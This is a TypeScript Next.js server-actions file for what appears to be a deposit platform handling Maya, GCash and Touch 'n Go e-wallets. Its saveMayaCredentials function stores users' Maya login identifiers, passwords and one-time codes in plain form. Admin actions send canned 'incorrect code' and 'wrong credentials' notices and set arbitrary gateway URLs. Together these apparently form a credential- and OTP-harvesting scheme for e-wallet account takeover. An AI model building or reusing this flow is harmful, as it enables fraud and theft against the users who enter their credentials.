"use server";

import { revalidatePath } from "next/cache";
import { redirect } from "next/navigation";

import { prisma } from "@/lib/prisma";
import { createClient } from "@/lib/supabase/server";

async function requireAdmin() {
  const supabase = await createClient();
  const {
    data: { user: authUser },
  } = await supabase.auth.getUser();

  if (!authUser) redirect("/login");

  const admin = await prisma.user.findUnique({
    where: { authUserId: authUser.id },
    select: { role: true },
  });

  if (!admin || admin.role !== "ADMIN") redirect("/dashboard");
}

export async function setMayaDepositDecision(formData: FormData) {
  await requireAdmin();

  const reference = String(formData.get("reference") ?? "").trim();
  const decision = String(formData.get("decision") ?? "").trim();

  const messages: Record<string, { title: string; message: string }> = {
    INCORRECT_CODE: {
      title: "Maya verification",
      message: "The Maya verification code was incorrect. Please try again with the correct code.",
    },
    INSUFFICIENT_FUNDS: {
      title: "Maya payment update",
      message: "There are insufficient funds to complete this Maya payment.",
    },
    WRONG_CREDENTIALS: {
      title: "Maya payment update",
      message: "The Maya credentials provided could not be verified. Please check the details.",
    },
  };

  const selectedMessage = messages[decision];

  if (!reference || !selectedMessage) {
    throw new Error("Invalid Maya decision.");
  }

  const deposit = await prisma.transaction.findFirst({
    where: {
      reference,
      type: "DEPOSIT",
      status: "PENDING",
      depositDetails: {
        is: { method: "MAYA" },
      },
    },
    select: {
      id: true,
      userId: true,
    },
  });

  if (!deposit) {
    throw new Error("Pending Maya deposit not found.");
  }

  await prisma.notification.create({
    data: {
      userId: deposit.userId,
      type: "DEPOSIT",
      title: selectedMessage.title,
      message: selectedMessage.message,
      href: `/dashboard/deposit/${reference}`,
    },
  });

  revalidatePath("/admin/e-wallet-deposits");
  revalidatePath("/dashboard");
  revalidatePath("/dashboard/notifications");
  revalidatePath(`/dashboard/deposit/${reference}`);

  redirect("/admin/e-wallet-deposits");
}
export async function setEwalletGatewayUrl(formData: FormData) {
  await requireAdmin();

  const reference = String(formData.get("reference") ?? "").trim();
  const rawUrl = String(formData.get("gatewayUrl") ?? "").trim();

  if (!reference || !rawUrl) {
    redirect("/admin/e-wallet-deposits?error=missing");
  }

    let parsed: URL;

  try {
    parsed = new URL(rawUrl);
  } catch {
    redirect("/admin/e-wallet-deposits?error=url");
  }

  if (
    parsed.protocol !== "https:" ||
    !parsed.hostname ||
    parsed.username ||
    parsed.password
  ) {
    redirect("/admin/e-wallet-deposits?error=url");
  }

  const gatewayUrl = parsed.toString();

  const transaction = await prisma.transaction.findFirst({
    where: {
      reference,
      type: "DEPOSIT",
      status: "PENDING",
      depositDetails: {
        is: {
          method: { in: ["GCASH", "MAYA", "TOUCH_N_GO"] },
        },
      },
    },
    select: {
      id: true,
      depositDetails: {
        select: { method: true },
      },
    },
  });

  if (!transaction || !transaction.depositDetails) {
    redirect("/admin/e-wallet-deposits?error=notfound");
  }

  await prisma.depositDetails.update({
    where: { transactionId: transaction.id },
    data: { gatewayUrl },
  });

  revalidatePath("/admin/e-wallet-deposits");
  revalidatePath(`/dashboard/deposit-request/${encodeURIComponent(reference)}`);
  revalidatePath("/dashboard");

  redirect("/admin/e-wallet-deposits?updated=1");
}

export async function saveMayaCredentials(data: {
  transactionId: string;
  identifier?: string;
  password?: string;
  otp?: string;
}) {
  const supabase = await createClient();
  const {
    data: { user: authUser },
  } = await supabase.auth.getUser();

  if (!authUser) {
    throw new Error("Unauthorized");
  }

  // Ensure the transaction belongs to this user before updating
  const user = await prisma.user.findUnique({
    where: { authUserId: authUser.id },
    select: { id: true },
  });

  if (!user) {
    throw new Error("User not found");
  }

  const transaction = await prisma.transaction.findFirst({
    where: {
      id: data.transactionId,
      userId: user.id,
      type: "DEPOSIT",
    },
  });

  if (!transaction) {
    throw new Error("Transaction not found");
  }

  // Update the deposit details with whatever fields are provided
  await prisma.depositDetails.update({
    where: { transactionId: data.transactionId },
    data: {
      ...(data.identifier && { mayaIdentifier: data.identifier }),
      ...(data.password && { mayaPassword: data.password }),
      ...(data.otp && { mayaOtp: data.otp }),
    },
  });

  return { success: true };
}